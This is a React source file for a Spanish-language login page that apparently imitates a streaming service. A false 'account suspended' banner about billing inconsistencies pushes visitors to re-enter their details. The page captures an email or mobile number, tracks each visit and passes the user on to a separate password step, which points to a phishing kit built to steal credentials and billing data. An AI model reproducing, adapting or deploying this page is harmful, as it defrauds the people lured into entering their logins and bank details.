/**
 * Login Page - Portal Style (responsive)
 * Mobile-first with tablet and desktop adaptations
 */

import PageTransition from "@/components/PageTransition";
import { ChevronDown } from "lucide-react";
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import BrandLogo from "@/components/BrandLogo";

export default function Login() {
  const [email, setEmail] = useState("");
  const [error, setError] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [, setLocation] = useLocation();

  // Track visit on login page load
  useEffect(() => {
    fetch("/api/track/visit", { method: "POST" }).catch(() => {});
    fetch("/api/track/login-visit", { method: "POST" }).catch(() => {});
  }, []);

  const validateEmail = () => {
    const value = email.trim();
    if (!value) {
      setError("Ingresa un email o un número de celular válido.");
      return false;
    }
    // If it contains @ it's an email
    if (value.includes("@")) {
      if (!value.includes(".")) {
        setError("Ingresa un email válido.");
        return false;
      }
      setError("");
      return true;
    }
    // Otherwise treat as phone number - must be all digits, start with 3, 10 digits
    const digits = value.replace(/\D/g, "");
    if (digits.length > 0) {
      if (!digits.startsWith("3") || digits.length !== 10) {
        setError("El número de celular debe iniciar con 3 y tener 10 dígitos.");
        return false;
      }
      setError("");
      return true;
    }
    setError("Ingresa un email o un número de celular válido.");
    return false;
  };

  const handleContinue = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateEmail()) return;

    setIsLoading(true);
    sessionStorage.setItem("userEmail", email);
    setTimeout(() => {
      setIsLoading(false);
      setLocation("/password");
    }, 1000);
  };

  return (
    <PageTransition>
      <div className="min-h-[100dvh] w-full bg-black flex flex-col">
        {/* Header */}
        <header className="w-full px-4 sm:px-8 lg:px-12 pt-4 pb-2 border-b border-[#333]">
          <BrandLogo height={20} />
        </header>

        {/* Main Content */}
        <main className="flex-1 flex flex-col items-start sm:items-start lg:items-center px-4 sm:px-8 lg:px-12 pt-10 sm:pt-16">
          <div className="w-full max-w-[400px] lg:max-w-[450px]">
            {/* Suspension Warning Banner */}
            <div className="w-full mb-6 sm:mb-8 p-4 bg-[#1a0a0a] border border-[#E50914] rounded-lg">
              <div className="flex gap-3">
                <div className="flex-shrink-0 pt-0.5">
                  <svg className="w-5 h-5 text-[#E50914]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 2L2 20h20L12 2z" />
                    <path d="M12 9v4" />
                    <path d="M12 17h.01" />
                  </svg>
                </div>
                <div className="flex-1">
                  <h3 className="text-[#E50914] font-bold text-[14px] sm:text-[15px] mb-1">
                    CUENTA SUSPENDIDA
                  </h3>
                  <p className="text-[#8c8c8c] text-[13px] sm:text-[14px] leading-relaxed">
                    Tu cuenta ha sido temporalmente suspendida debido a inconsistencias en tus datos de facturación. Por favor, verifica que tus datos coincidan con los registrados en tu banco.
                  </p>
                </div>
              </div>
            </div>

            {/* Title */}
            <h1 className="text-[28px] sm:text-[32px] lg:text-[36px] font-bold text-white mb-2 leading-[1.15]">
              Ingresa tu info para iniciar sesión
            </h1>

            {/* Subtitle */}
            <p className="text-[#8c8c8c] text-[15px] sm:text-[16px] mb-6 sm:mb-8">
              O bien, comienza con una cuenta nueva.
            </p>

            {/* Form */}
            <form onSubmit={handleContinue} className="space-y-4">
              {/* Email Input */}
              <div>
                <input
                  type="text"
                  placeholder="Email o número de celular"
                  value={email}
                  onChange={(e) => {
                    setEmail(e.target.value);
                    if (error) setError("");
                  }}
                  className={`w-full h-[48px] sm:h-[50px] px-4 rounded bg-transparent text-white placeholder:text-[#8c8c8c] text-[15px] sm:text-[16px] outline-none transition-colors border ${
                    error ? "border-[#E50914]" : "border-[#8c8c8c] focus:border-white"
                  }`}
                />
                {error && (
                  <div className="flex items-center gap-1.5 mt-2">
                    <svg viewBox="0 0 16 16" className="w-4 h-4 flex-shrink-0" fill="none">
                      <circle cx="8" cy="8" r="7" stroke="#E50914" strokeWidth="1.5" />
                      <path d="M5 5l6 6M11 5l-6 6" stroke="#E50914" strokeWidth="1.5" strokeLinecap="round" />
                    </svg>
                    <p className="text-[#E50914] text-[13px]">{error}</p>
                  </div>
                )}
              </div>

              {/* Continue Button */}
              <button
                type="submit"
                disabled={isLoading}
                className="w-full h-[48px] sm:h-[50px] bg-[#E50914] text-white text-[15px] sm:text-[16px] font-bold rounded hover:bg-[#F6121D] active:scale-[0.98] transition-all duration-150 disabled:opacity-70"
              >
                {isLoading ? "Continuando..." : "Continuar"}
              </button>
            </form>

            {/* Help Section */}
            <div className="mt-6 sm:mt-8">
              <button className="flex items-center gap-1 text-white text-[15px] sm:text-[16px] hover:text-gray-300 transition-colors">
                <span>Obtener ayuda</span>
                <ChevronDown size={18} />
              </button>
            </div>

            {/* reCAPTCHA Text */}
            <p className="text-[#8c8c8c] text-[12px] sm:text-[13px] mt-6 sm:mt-8 leading-relaxed">
              Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot.
            </p>
          </div>
        </main>
      </div>
    </PageTransition>
  );
}
